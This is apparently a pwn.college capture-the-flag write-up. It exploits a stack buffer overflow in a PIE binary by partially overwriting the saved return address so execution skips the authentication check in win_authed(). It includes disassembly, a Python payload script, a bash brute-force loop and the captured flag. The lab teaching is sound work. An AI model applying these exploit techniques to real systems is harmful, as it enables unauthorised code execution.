# Stage 13: PIEs (Easy) — Exploiting Partial Return Address Overwrites in PIE Binaries

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-pie-overflow-w` |
| **VT Score** | N/A |

---

## 1. Overview

This challenge from **pwn.college — Binary Exploitation** focuses on exploiting a stack-based buffer overflow in a binary compiled with Position Independent Executable (PIE) protection.

The objective was to redirect execution to `win_authed()` without satisfying its authentication condition.

Unlike a conventional ret2win exploit, PIE randomizes the executable's base address on each execution. This makes hardcoded absolute addresses unreliable.

The solution involved analyzing the binary, calculating the return-address offset, understanding PIE address alignment, and performing a two-byte partial overwrite.

## 2. Binary Analysis

The target binary:

```bash
/challenge/binary-exploitation-pie-overflow-w
```

Source file:

```bash
/challenge/binary-exploitation-pie-overflow-w.c
```

I started by inspecting the `win_authed()` function:

```bash
objdump -d -Mintel /challenge/binary-exploitation-pie-overflow-w | grep -A 30 '<win_authed>'
```

Relevant disassembly:

```asm
0000000000001c7b <win_authed>:
    1c7b: endbr64
    1c7f: push rbp
    1c80: mov rbp,rsp
    1c83: sub rsp,0x10
    1c87: mov DWORD PTR [rbp-0x4],edi
    1c8a: cmp DWORD PTR [rbp-0x4],0x1337
    1c91: jne 1d95 <win_authed+0x11a>
    1c97: lea rdi,[rip+0x1452]
```

The function checks whether the first argument equals `0x1337`.

If the condition fails, execution jumps to the failure path.

The instruction at offset `0x1c97` is immediately after the conditional authentication check.

This became the intended control-flow target.

## 3. Understanding the Buffer Overflow

The challenge source defines a 109-byte input buffer:

```c
struct {
    char input[109];
} data = {0};
```

Input is read using:

```c
read(0, &data.input, 4096);
```

The read size exceeds the buffer capacity, allowing data to overwrite adjacent stack memory.

The challenge also provides stack-address information, allowing the offset to the saved return address to be determined.

**Calculated offset:**

```text
136 bytes
```

The payload therefore needs 136 bytes of padding before reaching the saved RIP.

## 4. PIE and Address Randomization

PIE allows the executable to be loaded at different base addresses across executions.

For example, the runtime address of `win_authed()` changes between runs, even though its relative offset remains:

```text
win_authed = 0x1c7b
```

The important property is that PIE binaries are generally mapped on page-aligned boundaries.

A page-aligned base has its lower 12 bits set to zero:

```text
PIE_BASE & 0xfff = 0
```

Consequently, the lower 12 bits of an address inside the executable are determined by its relative offset.

This makes partial pointer overwrites useful: instead of replacing the entire 8-byte saved RIP, only selected lower bytes need to be modified.

## 5. Identifying the Target Address

The target instruction is:

```text
win_authed + 0x1c
```

Calculation:

```text
0x1c7b + 0x1c = 0x1c97
```

Therefore, the intended destination is the runtime address corresponding to:

```text
PIE_BASE + 0x1c97
```

The exploit does not need to know the complete PIE base address.

It only needs to overwrite the lower two bytes of the saved return address while preserving the remaining bytes.

## 6. Building the Exploit

I created the exploit script in my home directory:

```bash
nano ~/pie-partial.py
```

Exploit:

```python
import sys

guess = int(sys.argv[1])

payload = b"A" * 136
payload += bytes([0x97, (guess << 4) | 0x0c])

sys.stdout.buffer.write(payload)
```

### Payload breakdown

| Component | Purpose |
|---|---|
| `b"A" * 136` | Reaches the saved RIP |
| `0x97` | Overwrites the least significant byte |
| Bitwise OR of `(guess << 4)` and `0x0c` | Constructs the second overwritten byte |
| Remaining bytes | Preserved from the original return address |

The second byte is partially guessed because the randomized PIE base affects the relevant address bits.

This produces a probabilistic exploit rather than a deterministic full-address overwrite.

## 7. Automating the Attempts

To avoid manually testing each possible nibble, I automated the attempts:

```bash
for attempt in $(seq 1 50); do
    guess=$((RANDOM % 16))

    python3 ~/pie-partial.py "$guess" | \
    ./binary-exploitation-pie-overflow-w > /tmp/pie.out 2>&1

    if grep -q '^You win! Here is your flag:' /tmp/pie.out; then
        echo "[+] FLAG SUCCESS on attempt $attempt"
        cat /tmp/pie.out
        break
    fi

    echo "[-] Attempt $attempt failed (guess=$guess)"
done
```

The anchored `grep` pattern matters because the challenge's normal output also contains source-code text mentioning the win message.

The exploit succeeded on **attempt 10**.

## 8. Successful Execution

The successful run showed the overwritten return address:

```text
Saved RIP: 0x63418e22bc97
```

And the runtime address of `win_authed()`:

```text
win_authed(): 0x63418e22bc7b
```

The difference:

```text
0x63418e22bc97 - 0x63418e22bc7b = 0x1c
```

This confirmed that execution was redirected to:

```text
win_authed + 0x1c
```

The authentication comparison was bypassed because execution resumed after the conditional branch.

The challenge printed:

```text
You win! Here is your flag:
```

**Flag:**

```text
pwn.college{8Ajvccjh9s31ngXKv0CwPMVddfX.dFDMzwSO2gTN1IzW}
```

## 9. Technical Takeaways

This challenge demonstrated several important binary exploitation concepts:

- **Stack-based buffer overflow:** Overwriting saved control-flow data through an oversized input.
- **Saved RIP manipulation:** Redirecting execution by overwriting the saved return address.
- **PIE:** Understanding how executable base-address randomization affects exploitation.
- **Page alignment:** Using predictable lower address bits despite randomized mappings.
- **Partial pointer overwrite:** Modifying only the lower bytes of a 64-bit return address.
- **Control-flow redirection:** Returning directly into a function after its authentication check.
- **Probabilistic exploitation:** Automating retries when part of the required address is unknown.

## 10. Conclusion

The PIEs (Easy) challenge demonstrated that PIE does not make return-address manipulation impossible.

Although the executable's base address changes between runs, page alignment preserves useful address properties. By calculating the correct stack offset and applying a two-byte partial overwrite, I redirected execution to the desired instruction without needing a complete runtime address leak.

- **Challenge:** PIEs (Easy)
- **Platform:** pwn.college
- **Category:** Binary Exploitation
- **Result:** Successfully solved
